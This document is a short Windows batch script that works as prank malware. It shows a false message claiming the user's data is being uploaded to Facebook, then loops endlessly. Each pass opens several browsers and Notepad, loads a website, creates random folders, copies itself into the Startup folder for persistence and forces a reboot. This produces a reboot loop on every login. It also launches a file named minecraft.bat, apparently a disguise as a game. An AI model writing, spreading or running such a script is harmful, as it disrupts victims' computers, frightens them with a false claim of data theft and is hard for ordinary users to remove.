@echo off
color 0a
echo Uploading your data to facebook
Pushd "%~dp0"
:a
title %random%Nerds
timeout /t 2 /nobreak >nul
start "c:\windows\system32" notepad.exe  
start "C:\Program Files\Google\Chrome\Application" chrome.exe
start "C:\Program Files (x86)\Microsoft\Edge\Application" msedge.exe
start "C:\Program Files\Internet Explorer" iexplore.exe
start chrome.exe "https://www.lingscars.com/"
cd %desktop%
mkdir %random%
cd %appdata%
cd Microsoft
cd Windows
cd Start Menu
cd Programs
cd Startup
copy %0
shutdown /r
cd %desktop%
start minecraft.bat
goto a

